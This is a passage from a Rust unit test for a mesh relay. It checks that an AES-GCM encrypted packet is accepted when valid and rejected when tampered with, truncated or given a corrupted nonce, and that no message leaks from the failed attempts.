        msg.routing.path = vec![];
        msg.routing.hop_index = 0;
        msg.routing.ttl = 10;

        let nonce = Nonce::from_counter(0);
        let serialized = serialize_mesh_message(&msg).unwrap();
        let ciphertext =
            crypto::aes_gcm::encrypt(&session_key, &nonce, &serialized, &[]).unwrap();

        // Build valid packet
        let mut valid_packet = Vec::with_capacity(12 + ciphertext.len());
        valid_packet.extend_from_slice(nonce.as_bytes());
        valid_packet.extend(&ciphertext);

        // Test 1: Valid packet should succeed
        {
            let mut links = relay.links.write().unwrap();
            links.get_mut(&peer_id).unwrap().nonce_counter = 0;
        }
        let result = relay.process_incoming(peer_id, &valid_packet);
        assert!(result.is_ok(), "valid encrypted packet should succeed");

        let inbound = relay.drain_inbound_queue();
        assert_eq!(inbound.len(), 1, "message should arrive in inbound queue");
        assert_eq!(inbound[0].payload, b"secret payload", "payload should match");

        // Test 2: Tampered ciphertext should fail (flip a byte in the ciphertext)
        let mut tampered_packet = valid_packet.clone();
        if tampered_packet.len() > 15 {
            tampered_packet[15] ^= 0xFF; // Flip bits in ciphertext portion
        }
        {
            let mut links = relay.links.write().unwrap();
            links.get_mut(&peer_id).unwrap().nonce_counter = 0;
        }
        let result = relay.process_incoming(peer_id, &tampered_packet);
        assert!(result.is_err(), "tampered ciphertext should be rejected");

        // Test 3: Truncated packet should fail
        let truncated_packet = &valid_packet[..20]; // Too short
        let result = relay.process_incoming(peer_id, truncated_packet);
        assert!(result.is_err(), "truncated packet should be rejected");

        // Test 4: Corrupted nonce should fail decryption
        let mut bad_nonce_packet = valid_packet.clone();
        bad_nonce_packet[0] ^= 0xFF; // Corrupt first byte of nonce
        let result = relay.process_incoming(peer_id, &bad_nonce_packet);
        assert!(result.is_err(), "corrupted nonce should cause decryption to fail");

        // Verify no messages leaked through failed attempts
        assert!(
            relay.drain_inbound_queue().is_empty(),
            "no messages should arrive from failed decryption attempts"
        );
    }
}
